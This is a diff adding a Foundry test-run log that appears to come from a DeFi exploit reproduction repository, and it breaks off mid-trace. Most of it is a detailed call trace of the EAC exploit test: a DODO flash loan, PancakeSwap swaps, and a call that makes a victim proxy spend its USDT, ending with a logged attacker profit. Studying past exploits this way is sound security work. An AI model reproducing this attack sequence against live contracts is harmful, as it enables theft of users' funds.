@@ -1,0 +1,334 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.16s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (9302): Return value of low-level calls not used.
+  --> src/test/2023-08/EAC_exp.sol:37:9:
+   |
+37 |         proxy.call(abi.encodeWithSelector(0xe6a24c3f, IERC20(usdt).balanceOf(proxy)));
+   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 359.99ms (262.01µs CPU time)
+
+Ran 1 test for src/test/2023-08/EAC_exp.sol:ContractTest
+[PASS] testExploit() (gas: 577913)
+Logs:
+  Attacker USDT balance after exploit: 6376.857069483678926140
+
+Traces:
+  [693113] ContractTest::testExploit()
+    ├─ [689583] DODOPool::flashLoan(0, 300000000000000008388608 [3e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [12871] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 300000000000000008388608 [3e23])
+    │   │   ├─ emit Transfer(from: DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 300000000000000008388608 [3e23])
+    │   │   └─ ← [Return] true
+    │   ├─ [647875] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 300000000000000008388608 [3e23], 0x00)
+    │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 300000010000000008388608 [3e23]
+    │   │   ├─ [24562] USDT::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [272019] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(300000010000000008388608 [3e23], 0, [0x55d398326f99059fF775485246999027B3197955, 0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1693304711 [1.693e9])
+    │   │   │   ├─ [10834] USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, 300000010000000008388608 [3e23])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, value: 300000010000000008388608 [3e23])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640563739457574007913121251327 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2952] EAC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2893] 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 139983368763169741310420 [1.399e23], 3511794965051261266932 [3.511e21], 1693303231 [1.693e9]
+    │   │   │   ├─ [531] USDT::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   └─ ← [Return] 439983378763169749699028 [4.399e23]
+    │   │   │   ├─ [241715] 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c::swap(0, 2392588380557017627068 [2.392e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [206920] EAC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2392588380557017627068 [2.392e21])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, to: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, value: 71777651416710528812 [7.177e19])
+    │   │   │   │   │   ├─ [152852] 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971::aeb5957d()
+    │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 71787651416710528812 [7.178e19]
+    │   │   │   │   │   │   ├─ [25302] EAC::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 71787651416710528812 [7.178e19])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 71787651416710528812 [7.178e19])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [115780] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(71787651416710528812 [7.178e19], 0, [0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E, 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08], 0x000000000000000000000000000000000000dEaD, 1693303711 [1.693e9])
+    │   │   │   │   │   │   │   ├─ [23804] EAC::transferFrom(0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, 71787651416710528812 [7.178e19])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, to: 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, value: 71777651416710528812 [7.177e19])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [2930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 131680662684380762261317 [1.316e23]
+    │   │   │   │   │   │   │   ├─ [2893] 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 10712695209847068554910873 [1.071e25], 524868295442365811115245031 [5.248e26], 1693303231 [1.693e9]
+    │   │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 10712766987498485265439685 [1.071e25]
+    │   │   │   │   │   │   │   ├─ [72129] 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA::swap(0, 3507929341635271249830 [3.507e21], 0x000000000000000000000000000000000000dEaD, 0x)
+    │   │   │   │   │   │   │   │   ├─ [36935] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::transfer(0x000000000000000000000000000000000000dEaD, 3507929341635271249830 [3.507e21])
+    │   │   │   │   │   │   │   │   │   ├─ [2867] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::tradeMapping(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   ├─ [2867] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::tradeMapping(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   ├─ [8127] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::sell()
+    │   │   │   │   │   │   │   │   │   │   ├─ [2930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, to: 0x000000000000000000000000000000000000dEaD, value: 3507929341635271249830 [3.507e21])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 10712766987498485265439685 [1.071e25]
+    │   │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 524864787513024175843995201 [5.248e26]
+    │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 10712766987498485265439685 [1.071e25], reserve1: 524864787513024175843995201 [5.248e26])
+    │   │   │   │   │   │   │   │   ├─ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 71777651416710528812 [7.177e19], amount1In: 0, amount0Out: 0, amount1Out: 3507929341635271249830 [3.507e21], to: 0x000000000000000000000000000000000000dEaD)
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 135188592026016033511147 [1.351e23]
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ emit Transfer(from: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2320810729140307098256 [2.32e21])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 439983378763169749699028 [4.399e23]
+    │   │   │   │   ├─ [952] EAC::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1119206584494243639864 [1.119e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 439983378763169749699028 [4.399e23], reserve1: 1119206584494243639864 [1.119e21])
+    │   │   │   │   ├─ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 300000010000000008388608 [3e23], amount1In: 0, amount0Out: 0, amount1Out: 2392588380557017627068 [2.392e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [952] EAC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2320810729140307098256 [2.32e21]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [2531] USDT::balanceOf(0xa08a40e0F11090Dcb09967973DF82040bFf63561) [staticcall]
+    │   │   │   └─ ← [Return] 14300000000000000000000 [1.43e22]
+    │   │   ├─ [173392] 0xa08a40e0F11090Dcb09967973DF82040bFf63561::e6a24c3f(000000000000000000000000000000000000000000000307345d9b5a55f00000)
+    │   │   │   ├─ [166076] 0xb803eD66aB449D80Ed12Cacf83eaE5147fDC6922::e6a24c3f(000000000000000000000000000000000000000000000307345d9b5a55f00000) [delegatecall]
+    │   │   │   │   ├─ [531] USDT::balanceOf(0xa08a40e0F11090Dcb09967973DF82040bFf63561) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14300000000000000000000 [1.43e22]
+    │   │   │   │   ├─ [24562] USDT::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 14300000000000000000000 [1.43e22])
+    │   │   │   │   │   ├─ emit Approval(owner: 0xa08a40e0F11090Dcb09967973DF82040bFf63561, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 14300000000000000000000 [1.43e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [132051] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(14300000000000000000000 [1.43e22], 0, [0x55d398326f99059fF775485246999027B3197955, 0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E], 0x279B8306bB7CD010eEDF1227536464A31d6afeA1, 1693303711 [1.693e9])
+    │   │   │   │   │   ├─ [8834] USDT::transferFrom(0xa08a40e0F11090Dcb09967973DF82040bFf63561, 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, 14300000000000000000000 [1.43e22])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0xa08a40e0F11090Dcb09967973DF82040bFf63561, to: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, value: 14300000000000000000000 [1.43e22])
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0xa08a40e0F11090Dcb09967973DF82040bFf63561, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [2952] EAC::balanceOf(0x279B8306bB7CD010eEDF1227536464A31d6afeA1) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5001519616667225776580426 [5.001e24]
+    │   │   │   │   │   ├─ [893] 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 439983378763169749699028 [4.399e23], 1119206584494243639864 [1.119e21], 1693303711 [1.693e9]
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 454283378763169749699028 [4.542e23]
+    │   │   │   │   │   ├─ [110747] 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c::swap(0, 35145241300082759780 [3.514e19], 0x279B8306bB7CD010eEDF1227536464A31d6afeA1, 0x)
+    │   │   │   │   │   │   ├─ [95236] EAC::transfer(0x279B8306bB7CD010eEDF1227536464A31d6afeA1, 35145241300082759780 [3.514e19])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, to: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, value: 1054357239002482793 [1.054e18])
+    │   │   │   │   │   │   │   ├─ [75568] 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971::aeb5957d()
+    │   │   │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1064357239002482793 [1.064e18]
+    │   │   │   │   │   │   │   │   ├─ [23202] EAC::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1064357239002482793 [1.064e18])
+    │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1064357239002482793 [1.064e18])
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   ├─ [46596] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(1064357239002482793 [1.064e18], 0, [0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E, 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08], 0x000000000000000000000000000000000000dEaD, 1693303711 [1.693e9])
+    │   │   │   │   │   │   │   │   │   ├─ [9004] EAC::transferFrom(0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, 1064357239002482793 [1.064e18])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, to: 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, value: 1054357239002482793 [1.054e18])
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 135188592026016033511147 [1.351e23]
+    │   │   │   │   │   │   │   │   │   ├─ [893] 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 10712766987498485265439685 [1.071e25], 524864787513024175843995201 [5.248e26], 1693303711 [1.693e9]
+    │   │   │   │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 10712768041855724267922478 [1.071e25]
+    │   │   │   │   │   │   │   │   │   ├─ [26745] 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA::swap(0, 51528372379612185155 [5.152e19], 0x000000000000000000000000000000000000dEaD, 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ [10835] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::transfer(0x000000000000000000000000000000000000dEaD, 51528372379612185155 [5.152e19])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [867] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::tradeMapping(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [867] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::tradeMapping(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [2127] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::sell()
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, to: 0x000000000000000000000000000000000000dEaD, value: 51528372379612185155 [5.152e19])
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 10712768041855724267922478 [1.071e25]
+    │   │   │   │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 524864735984651796231810046 [5.248e26]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 10712768041855724267922478 [1.071e25], reserve1: 524864735984651796231810046 [5.248e26])
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 1054357239002482793 [1.054e18], amount1In: 0, amount0Out: 0, amount1Out: 51528372379612185155 [5.152e19], to: 0x000000000000000000000000000000000000dEaD)
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 135240120398395645696302 [1.352e23]
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, to: 0x279B8306bB7CD010eEDF1227536464A31d6afeA1, value: 34090884061080276987 [3.409e19])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [531] USDT::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 454283378763169749699028 [4.542e23]
+    │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 1084061343194160880084 [1.084e21]
+    │   │   │   │   │   │   ├─ emit Sync(reserve0: 454283378763169749699028 [4.542e23], reserve1: 1084061343194160880084 [1.084e21])
+    │   │   │   │   │   │   ├─ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 14300000000000000000000 [1.43e22], amount1In: 0, amount0Out: 0, amount1Out: 35145241300082759780 [3.514e19], to: 0x279B8306bB7CD010eEDF1227536464A31d6afeA1)
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [952] EAC::balanceOf(0x279B8306bB7CD010eEDF1227536464A31d6afeA1) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5001553707551286856857413 [5.001e24]
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [952] EAC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 2320810729140307098256 [2.32e21]
+    │   │   ├─ [25302] EAC::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [131022] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(2320810729140307098256 [2.32e21], 0, [0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1693304711 [1.693e9])
+    │   │   │   ├─ [102141] EAC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, 2320810729140307098256 [2.32e21])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, value: 46416014582806141965 [4.641e19])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 23208007291403070982 [2.32e19])
+    │   │   │   │   ├─ [75568] 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971::aeb5957d()
+    │   │   │   │   │   ├─ [952] EAC::balanceOf(0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 46426014582806141965 [4.642e19]
+    │   │   │   │   │   ├─ [23202] EAC::approve(PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 46426014582806141965 [4.642e19])
+    │   │   │   │   │   │   ├─ emit Approval(owner: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 46426014582806141965 [4.642e19])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [46596] PANCAKE_ROUTER_V2::swapExactTokensForTokensSupportingFeeOnTransferTokens(46426014582806141965 [4.642e19], 0, [0x64f291DE10eCd36D5f7b64aaEbC70943CFACE28E, 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08], 0x000000000000000000000000000000000000dEaD, 1693303711 [1.693e9])
+    │   │   │   │   │   │   ├─ [9004] EAC::transferFrom(0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, 46426014582806141965 [4.642e19])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, spender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
